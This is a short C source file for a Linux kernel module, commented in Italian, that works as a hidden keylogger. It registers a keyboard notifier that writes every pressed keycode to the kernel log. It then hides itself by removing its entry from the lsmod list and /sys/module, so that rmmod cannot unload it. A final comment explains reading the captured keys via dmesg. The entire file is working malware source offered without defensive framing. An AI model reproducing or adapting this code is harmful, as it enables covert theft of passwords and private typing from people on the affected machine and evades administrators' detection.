#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/list.h>

// Funzione per nascondere il modulo
void hide_module(void) {
    // Rimuove il modulo dalla lista visualizzata da lsmod
    list_del(&THIS_MODULE->list);
    // Rimuove il modulo da /sys/module per non lasciarne traccia nel file system
    kobject_del(&THIS_MODULE->mkobj.kobj);
}

// Funzione che intercetta i tasti
int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYCODE && param->down) {
        printk(KERN_INFO "HIDDEN_KEYLOG: Tasto %d\n", param->value);
    }

    return NOTIFY_OK;
}

static struct notifier_block keylogger_nb = {
    .notifier_call = keylogger_notify
};

static int __init keylog_init(void) {
    // 1. Registra il logger
    register_keyboard_notifier(&keylogger_nb);
    
    // 2. Nasconde il modulo immediatamente
    hide_module();

    printk(KERN_NOTICE "HIDDEN_KEYLOG: Avviato e nascosto.\n");
    return 0;
}

static void __exit keylog_exit(void) {
    // NOTA: Se il modulo è nascosto, non potrai usare rmmod!
    // Questo codice verrà eseguito solo allo spegnimento del sistema
    unregister_keyboard_notifier(&keylogger_nb);
}

module_init(keylog_init);
module_exit(keylog_exit);
MODULE_LICENSE("GPL");


#Monitoraggio: Per vedere se sta effettivamente catturando i tasti, devi comunque usare:
#tail -f /var/log/kern.log oppure dmesg | tail